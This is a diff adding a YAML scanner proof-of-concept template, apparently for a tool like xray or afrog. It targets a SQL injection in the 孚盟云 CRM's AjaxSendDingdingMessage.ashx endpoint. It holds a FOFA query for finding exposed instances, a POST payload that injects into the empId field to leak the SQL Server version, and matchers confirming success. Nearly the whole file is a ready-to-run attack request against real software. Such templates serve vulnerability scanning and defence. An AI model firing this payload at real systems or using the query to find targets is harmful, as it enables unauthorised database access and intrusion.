@@ -1,0 +1,25 @@
+id: poc-yaml-fumengyun-ajaxmethod-ashx-psot-sqli
+info:
+  name: 孚盟云 AjaxMethod.ashx-post SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: title="孚盟云 "
+requests:
+- method: POST
+  path: /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=SendDingMeg_Mail&empId=2'+and+1=@@version--+
+  expression: 'status_code == 200 &&
+
+    contains(body,"Microsoft SQL Server") &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,"Windows")
+
+    '
+variables: {}
+transport: http
